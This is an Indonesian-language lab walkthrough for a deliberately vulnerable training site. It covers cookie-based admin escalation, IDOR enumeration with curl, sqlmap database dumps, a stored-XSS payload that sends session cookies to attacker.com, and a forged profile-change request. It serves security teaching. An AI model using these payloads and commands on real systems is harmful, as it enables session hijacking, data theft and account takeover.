# 🛡️ ACT LAB :: PRO-LEVEL EXPLOITATION GUIDE (SEMINAR EDITION)

Panduan ini fokus pada penggunaan Tools Linux (cURL, SQLmap) dan manipulasi Header/Cookie untuk eksploitasi profesional.

---

## 1. PRIVILEGE ESCALATION :: NAVBAR MANIPULATION
**Target:** Seluruh Platform (Global Navbar)
**Tujuan:** Memunculkan Menu "Admin Panel" yang tersembunyi.

### 🛠️ Hack via Browser Console (F12)
1. Buka Console (F12).
2. Ketik perintah ini untuk menyamar jadi Admin:
   ```javascript
   document.cookie = "role=admin; path=/";
   location.reload();
   ```
3. **Hasil:** Navbar akan berkedip merah dan memunculkan tombol `⚠️ ADMIN_ACCESS_GRANTED`.

---

## 2. IDOR :: INTERNAL API EXFILTRATION
**Target:** `/lab/idor`
**Tujuan:** Mencuri data Biodata Admin.

### 🤖 Linux cURL Automation
Gunakan perintah ini untuk memindai user ID 1 sampai 5 secara otomatis:
```bash
for i in {1..5}; do curl -s "http://act-lab.app/api/profile?id=$i" | grep -E "username|bio"; done
```

### 🛠️ Burp Suite Method
1. Intercept request ke `/api/profile?id=999`.
2. Kirim ke **Repeater**.
3. Ubah angka `999` menjadi `1`.
4. Lihat respon: Flag IDOR tersimpan di field `bio` milik Admin.

---

## 3. SQL INJECTION :: AUTOMATED DATA DUMP
**Target:** `/lab/sqli-union`

### 🤖 SQLmap (The Professional Way)
Jangan gunakan cara manual jika ingin terlihat "Pro". Gunakan SQLmap:
```bash
# Scan Database
sqlmap -u "http://act-lab.app/api/search?q=test" --batch --dbs

# Dump Tabel Challenges untuk mengambil Flag
sqlmap -u "http://act-lab.app/api/search?q=test" --batch -D act_lab -T challenges --dump
```

---

## 4. XSS :: COOKIE STEALING & HIJACKING
**Target:** `/lab/xss-stored`

### ⚡ Professional Payload (Cookie Hunter)
Tanam script ini untuk mensimulasikan pencurian session cookie:
```html
<script>
  fetch('http://attacker.com/log?cookie=' + btoa(document.cookie));
  alert('XSS_SUCCESS');
</script>
```
*(Catatan: Flag akan muncul otomatis karena alert() dibajak oleh sistem ACT LAB).*

---

## 5. CSRF :: REMOTE ACCOUNT TAKEOVER
**Target:** `/lab/csrf`

### 🤖 Linux Automation (cURL)
Tunjukkan bagaimana attacker bisa mengganti email user tanpa browser, cukup lewat Terminal:
```bash
curl -X POST "http://act-lab.app/api/profile" \
     -H "Content-Type: application/json" \
     -H "Referer: http://malicious-site.com" \
     -d '{"email":"hacker@actlab.pro"}'
```
*(Cek "Traffic Monitor" di halaman lab untuk melihat log serangan ini muncul secara real-time).*

---

## 🛰️ TIPS SEMINAR: "THE LINUX LOOK"
*   Gunakan **Terminal dengan background hitam** (Oh My Zsh / Powerlevel10k) saat menjalankan cURL.
*   Buka **Burp Suite** di monitor kedua untuk menunjukkan alur data yang lewat.
*   Selalu tekankan bahwa "Hacking bukan tentang klik-klik tombol, tapi tentang memahami alur data HTTP".

**ACT LAB :: NEXT-GEN SECURITY EDUCATION**
